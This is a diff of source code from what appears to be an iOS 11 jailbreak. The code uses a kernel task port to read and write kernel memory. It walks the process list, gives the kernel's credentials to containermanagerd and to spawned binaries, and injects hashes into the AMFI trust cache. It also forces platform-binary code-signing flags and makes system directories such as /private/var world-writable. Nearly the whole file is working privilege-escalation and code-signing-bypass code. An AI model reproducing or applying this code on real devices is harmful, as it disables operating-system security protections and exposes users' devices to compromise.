@@ -12,114 +12,34 @@
 #include "kcall.h"
 #include "symbols.h"
 #include "kmem.h"
+#include "utilities.h"
 #include "amfi_codesign.h"
 #include "patchfinder64_11.h"
 
 #include <errno.h>
 #include <dirent.h>
 
-mach_port_t tfp0 = MACH_PORT_NULL;
-
-kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
-kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
-kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
-
 uint64_t trust_cache = 0;
 uint64_t amficache = 0;
 
+uint64_t containermanagerd_proc = 0;
+uint64_t contaienrmanagerd_cred = 0;
 uint64_t kernel_trust = 0;
 
-size_t
-kread(uint64_t where, void *p, size_t size)
-{
-
-    if(tfp0 == MACH_PORT_NULL) {
-        printf("[ERROR]: tfp0's port is null!\n");
-    }
-
-    int rv;
-    size_t offset = 0;
-    while (offset < size) {
-        mach_vm_size_t sz, chunk = 2048;
-        if (chunk > size - offset) {
-            chunk = size - offset;
-        }
-        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
-
-        if (rv || sz == 0) {
-            printf("[ERROR]: error reading buffer at @%p\n", (void *)(offset + where));
-            break;
-        }
-        offset += sz;
-    }
-    return offset;
-}
-
-uint64_t
-kread_uint64(uint64_t where)
-{
-    uint64_t value = 0;
-    size_t sz = kread(where, &value, sizeof(value));
-    return (sz == sizeof(value)) ? value : 0;
-}
-
-uint32_t
-kread_uint32(uint64_t where)
-{
-    uint32_t value = 0;
-    size_t sz = kread(where, &value, sizeof(value));
-    return (sz == sizeof(value)) ? value : 0;
-}
-
-size_t
-kwrite(uint64_t where, const void *p, size_t size)
-{
-
-    if(tfp0 == MACH_PORT_NULL) {
-        printf("[ERROR]: tfp0's port is null!\n");
-    }
-
-    int rv;
-    size_t offset = 0;
-    while (offset < size) {
-        size_t chunk = 2048;
-        if (chunk > size - offset) {
-            chunk = size - offset;
-        }
-        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
-        if (rv) {
-            printf("[ERROR]: error copying buffer into region: @%p\n", (void *)(offset + where));
-            break;
-        }
-        offset += chunk;
-    }
-    return offset;
-}
-
-size_t
-kwrite_uint64(uint64_t where, uint64_t value)
-{
-    return kwrite(where, &value, sizeof(value));
-}
-
-size_t
-kwrite_uint32(uint64_t where, uint32_t value)
-{
-    return kwrite(where, &value, sizeof(value));
-}
 
 /*
  * Purpose: iterates over the procs and finds our proc
  */
-uint64_t get_proc_for_pid(pid_t target_pid) {
+uint64_t get_proc_for_pid(pid_t target_pid, int spawned) {
     
     uint64_t task_self = task_self_addr();
-    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    
-    
-    while (struct_task != 0) {
-        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
 
+    uint64_t original_struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    
+    // go backwards first
+    while (original_struct_task != -1) {
+        uint64_t bsd_info = rk64(original_struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        
         // get the process pid
         uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         
@@ -127,11 +47,15 @@ uint64_t get_proc_for_pid(pid_t target_pid) {
             return bsd_info;
         }
 
-        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+        if(spawned) // spawned binaries will exist AFTER our task
+            original_struct_task = rk64(original_struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
+        else
+            original_struct_task = rk64(original_struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
         
-        if(struct_task == -1)
-            return -1;
     }
+
+    printf("[INFO]: no proc was found for pid: %d\n", target_pid);
+    
     return -1; // we failed :/
 }
 
@@ -168,39 +92,39 @@ pid_t get_pid_for_name(char *name) {
 /*
  * Purpose: iterates over the procs and finds a proc with given name
  */
-NSMutableArray *processed_procs;
-uint64_t get_proc_for_name(char *name) {
-    
-    if(processed_procs == nil)
-        processed_procs = [[NSMutableArray alloc] init];
-    
-    uint64_t task_self = task_self_addr();
-    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    
-    
-    while (struct_task != 0) {
-        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-        
-        if([processed_procs containsObject:@(bsd_info)])
-            continue;
-
-        
-        char comm[MAXCOMLEN+1];
-        kread(bsd_info + 0x268 /* KSTRUCT_OFFSET_PROC_COMM (is this iPhone X offset??) */, comm, 17);
-        
-        if(strcmp(name, comm) == 0) {
-            
-            return bsd_info;
-        }
-        
-        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
-        
-        [processed_procs addObject:@(bsd_info)];
-        if(struct_task == -1)
-            return -1;
-    }
-    return -1; // we failed :/
-}
+//NSMutableArray *processed_procs;
+//uint64_t get_proc_for_name(char *name) {
+//    
+//    if(processed_procs == nil)
+//        processed_procs = [[NSMutableArray alloc] init];
+//    
+//    uint64_t task_self = task_self_addr();
+//    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+//    
+//    
+//    while (struct_task != 0) {
+//        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+//        
+//        if([processed_procs containsObject:@(bsd_info)])
+//            continue;
+//
+//        
+//        char comm[MAXCOMLEN+1];
+//        kread(bsd_info + 0x268 /* KSTRUCT_OFFSET_PROC_COMM (is this iPhone X offset??) */, comm, 17);
+//        
+//        if(strcmp(name, comm) == 0) {
+//            
+//            return bsd_info;
+//        }
+//        
+//        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+//        
+//        [processed_procs addObject:@(bsd_info)];
+//        if(struct_task == -1)
+//            return -1;
+//    }
+//    return -1; // we failed :/
+//}
 
 
 uint64_t our_proc = 0;
@@ -211,7 +135,7 @@ void set_uid0 () {
     kern_return_t ret = KERN_SUCCESS;
     
     if(our_proc == 0)
-        our_proc = get_proc_for_pid(getpid());
+        our_proc = get_proc_for_pid(getpid(), false);
     
     if(our_proc == -1) {
         printf("[ERROR]: no our proc. wut\n");
@@ -329,10 +253,12 @@ kern_return_t unpack_bootstrap() {
         
         chmod("/private", 0777);
         chmod("/private/var", 0777);
+        chmod("/private/var/tmp", 0777);
         chmod("/private/var/mobile", 0777);
         chmod("/private/var/mobile/Library", 0777);
+        chmod("/private/var/mobile/Library/Caches/", 0777);
         chmod("/private/var/mobile/Library/Preferences", 0777);
-    
+        
         set_cred_back();
         extern void uicache(void);
         uicache(); // used to show Cydia.app
@@ -409,7 +335,7 @@ kern_return_t unpack_bootstrap() {
     printf("[INFO]: finished installing bootstrap and friends\n");
 
     // "fix" containermanagerd
-    uint64_t containermanagerd_proc = get_proc_for_pid(get_pid_for_name("containermanager"));
+    containermanagerd_proc = get_proc_for_pid(get_pid_for_name("containermanager"), false);
     
     if(containermanagerd_proc == -1) {
         printf("[ERROR]: no containermanagerd. wut\n");
@@ -420,13 +346,12 @@ kern_return_t unpack_bootstrap() {
     printf("[INFO]: got containermanagerd's proc: %llx\n", containermanagerd_proc);
     
     // fix containermanagerd
-    uint64_t contaienrmanagerd_cred = kread_uint64(containermanagerd_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    contaienrmanagerd_cred = kread_uint64(containermanagerd_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
     printf("[INFO]: got containermanagerd's ucred: %llx\n", contaienrmanagerd_cred);
 
     extern uint64_t kernel_task;
     uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
     kwrite_uint64(containermanagerd_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
-    
     
     trust_cache = find_trustcache();
     amficache = find_amficache();
@@ -436,21 +361,21 @@ kern_return_t unpack_bootstrap() {
 
     // we're just doing Cydia for now..
     ret = trust_path("/Applications/Cydia.app");
-    ret = run_path("/Applications/Cydia.app/Cydia");
+    ret = trust_path("/bin");
+    ret = trust_path("/usr/bin");
+    ret = trust_path("/usr/libexec/cydia");
+    
+//    extern void start_jailbreakd(void);
+//    start_jailbreakd();
+    
+    ret = run_path("/Applications/Cydia.app/uicache");
 
-//    while (1) {
-//
-//        uint64_t cydia_proc = get_proc_for_name("Cydia");
-//
-//        if(cydia_proc != -1) {
-//            uint32_t csflags = kread_uint32(cydia_proc  + 0x2a8 /* csflags */);
-//            csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
-//            kwrite_uint32(cydia_proc  + 0x2a8 /* csflags */, csflags);
-//            kwrite_uint64(cydia_proc+ 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, contaienrmanagerd_cred);
-//            printf("empowered Cydia!\n");
-//            break;
-//        }
+    // we probably don't want to do this for now..
+//    if (containermanagerd_proc) {
+//        kwrite_uint64(containermanagerd_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, contaienrmanagerd_cred);
+//        printf("[INFO]: gave containermanager its original creds\n");
 //    }
+
 
     // respring
 //    pid_t backboardd_pid = get_pid_for_name("backboardd");
@@ -464,6 +389,7 @@ kern_return_t unpack_bootstrap() {
 kern_return_t trust_path(char const *path) {
     
     kern_return_t ret = KERN_SUCCESS;
+    extern mach_port_t tfp0;
     
 #define USE_LIBJB
 #ifdef USE_LIBJB
@@ -475,11 +401,10 @@ kern_return_t trust_path(char const *path) {
     
     int rv = grab_hashes(path, kread, amficache, mem.next);
     printf("rv = %d, numhash = %d\n", rv, numhash);
-    sleep(1);
     
     size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
     
-    if(kernel_task == 0) {
+    if(kernel_trust == 0) {
         ret = mach_vm_allocate(tfp0, (mach_vm_address_t *)&kernel_trust, length, VM_FLAGS_ANYWHERE);
         if(ret != KERN_SUCCESS) {
             printf("[ERROR]: failed to allocate memory\n");
@@ -487,18 +412,13 @@ kern_return_t trust_path(char const *path) {
         }
     }
     printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
-    sleep(1);
     
     mem.count = numhash;
     kwrite(kernel_trust, &mem, sizeof(mem));
     kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
     kwrite_uint64(trust_cache, kernel_trust);
     printf("[INFO]: wrote trust cache\n");
-    sleep(1);
     
-    free(allhash);
-    free(allkern);
-    free(amfitab);
 #else
     
     struct topanga_trust_mem topanga_mem;
@@ -520,7 +440,6 @@ kern_return_t trust_path(char const *path) {
     
 
     kwrite(kernel_trust, &topanga_mem, sizeof(topanga_mem));
-    //    kwrite(kernel_trust + sizeof(topanga_mem), allhash, 1 * 20);
     kwrite_uint64(trust_cache, kernel_trust);
     printf("[INFO]: wrote trust cache\n");
     sleep(1);
@@ -538,30 +457,21 @@ kern_return_t run_path(const char *path) {
     posix_spawn(&pd, path, NULL, NULL, (char **)&(const char*[]){path, NULL }, NULL);
     
     printf("uicache: %d\n", pd);
+    uint64_t proc = get_proc_for_pid(pd, true);
     
-    int tries = 3;
-    while (tries-- > 0) {
-        sleep(1);
-        uint64_t proc = kread_uint64(0xFFFFFFF007673D68 + kaslr_slide);
-        while (proc) {
-            uint32_t pid = kread_uint32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
-            
-            if (pid == pd) {
-                uint32_t csflags = kread_uint32(proc  + 0x2a8 /* csflags */);
-                csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
-                kwrite_uint32(proc  + 0x2a8 /* csflags */, csflags);
-                printf("empower\n");
-                tries = 0;
-                break;
-            }
-            proc = kread_uint64(proc);
-        }
-    }
+    printf("proc: %llx\n", proc);
+
+    uint32_t csflags = kread_uint32(proc  + 0x2a8 /* csflags */);
+    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
+    kwrite_uint32(proc  + 0x2a8 /* csflags */, csflags);
+    
+    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    kwrite_uint64(proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
+    printf("empower\n");
+
+    
     waitpid(pd, NULL, 0);
     
-//    set_cred_back();
-//    exit(0);
-//
     return ret;
 }
 
